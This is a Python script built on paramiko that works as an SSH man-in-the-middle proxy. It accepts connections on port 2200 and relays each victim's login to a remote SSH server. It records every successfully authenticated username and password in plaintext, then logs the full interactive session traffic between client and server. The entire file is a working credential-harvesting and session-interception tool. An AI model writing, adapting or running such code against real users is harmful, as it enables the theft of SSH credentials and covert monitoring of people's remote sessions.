#!/usr/bin/env python

import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import select

import paramiko
from paramiko.py3compat import b, u, decodebytes
import logging
from datetime import datetime

# setup logging
paramiko.util.log_to_file("sshserver.log")

host_key = paramiko.RSAKey(filename="id_rsa")
# host_key = paramiko.DSSKey(filename='test_dss.key')


remotesshserver = "1.1.1.1"

class Server(paramiko.ServerInterface):
    # 'data' is the output of base64.b64encode(key)
    # (using the "user_rsa_key" files)

    def __init__(self,remotesshserver):
        self.remotesshserver = remotesshserver
        self.client = paramiko.SSHClient()
        self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.event = threading.Event()
        logger = logging.getLogger(datetime.now().strftime("%d-%m-%Y-%H-%M-%S"))
        logger.setLevel(level=logging.DEBUG)
        logFileFormatter = logging.Formatter(
            fmt=f"%(asctime)s - %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S",
        )
        fileHandler = logging.FileHandler(filename=(datetime.now().strftime("%d-%m-%Y-%H-%M-%S")+".log"))
        fileHandler.setFormatter(logFileFormatter)
        fileHandler.setLevel(level=logging.INFO)

        logger.addHandler(fileHandler)
        self.logger = logger

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        try:
            self.client.connect(remotesshserver, username=username,
                                password=password, port=22)
            self.logger.critical(f"Authenticated! username = {username} , password = {password}")
            print(f"Authenticated! username = {username} , password = {password}")
            return paramiko.AUTH_SUCCESSFUL
        except Exception as e:
            return paramiko.AUTH_FAILED
        
    def get_remote_server_channel(self):
        return self.client.invoke_shell()

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_pty_request(
        self, channel, term, width, height, pixelwidth, pixelheight, modes
    ):
        return True
    
    def get_logger(self):
        return self.logger
    
def handle_ssh_connection(client,server):
    print("Got a connection!")
    try:
        t = paramiko.Transport(client)
        try:
            t.load_server_moduli()
        except:
            print("(Failed to load moduli -- gex will be unsupported.)")
            raise
        t.add_server_key(host_key)
        server = Server(remotesshserver)
        try:
            t.start_server(server=server)
        except paramiko.SSHException:
            print("*** SSH negotiation failed.")
            return

        # wait for auth
        chan = t.accept(20)
        if chan is None:
            print("*** No channel.")
            return

        chan2 = server.get_remote_server_channel()
        logger = server.get_logger()
        client_talking = True
        past_stream = b""
        while True:
            r, w, e = select.select([chan2, chan], [], [])
            if chan in r:
                x = chan.recv(1024)
                if len(x) == 0:
                    break
                if client_talking:
                    past_stream += x
                else:
                    client_talking = True
                    if len(past_stream) != 0:
                        logger.info("[server] " + past_stream.decode())
                    past_stream = x
                    
                chan2.send(x)
            if chan2 in r:
                x = chan2.recv(1024)
                if len(x) == 0:
                    break
                if not client_talking:
                    past_stream += x
                else:
                    client_talking = False
                    if len(past_stream) != 0:
                        logger.info("[client] " + past_stream.decode())
                    past_stream = x
                chan.send(x)
        if len(past_stream) != 0:
            if client_talking:
                logger.info("[client] " + past_stream.decode())
            else:
                logger.info("[server] " + past_stream.decode())
        server.event.wait(10)
        if not server.event.is_set():
            t.close()
            return
        chan.close()

    except Exception as e:
        print("*** Caught exception: " + str(e.__class__) + ": " + str(e))
        traceback.print_exc()
        try:
            t.close()
        except:
            pass

def ssh_mitm():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", 2200))
    except Exception as e:
        print("*** Bind failed: " + str(e))
        traceback.print_exc()
        return

    while True:
        try:
            sock.listen(100)
            client, addr = sock.accept()
            threading.Thread(target = handle_ssh_connection, args = (client,addr)).start()
        except Exception as e:
            print("*** Listen/accept failed: " + str(e))
            traceback.print_exc()
            return
        except KeyboardInterrupt:
            break
            
def set_remote_server_address(address):
    global remotesshserver
    remotesshserver = address

if __name__ == "__main__":
    ssh_mitm()